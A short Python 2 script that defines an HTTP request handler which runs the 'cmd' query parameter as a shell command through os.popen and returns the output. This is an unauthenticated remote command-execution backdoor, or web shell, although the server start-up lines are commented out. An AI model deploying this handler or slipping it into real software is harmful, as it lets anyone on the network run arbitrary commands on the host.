from urlparse import urlparse, parse_qs
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import webbrowser
import os

class myHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        var = parse_qs(urlparse(self.path).query)
        print var
        if "cmd" in var:
            content = os.popen(var["cmd"][0]).read()
        else:
            content = ""
        self.wfile.write(content)
        return

try:
    webbrowser.open("http://www.google.com")
    #server = HTTPServer(("",8000), myHandler)
    #server.serve_forever()
except KeyboardInterrupt:
    server.socket.close()


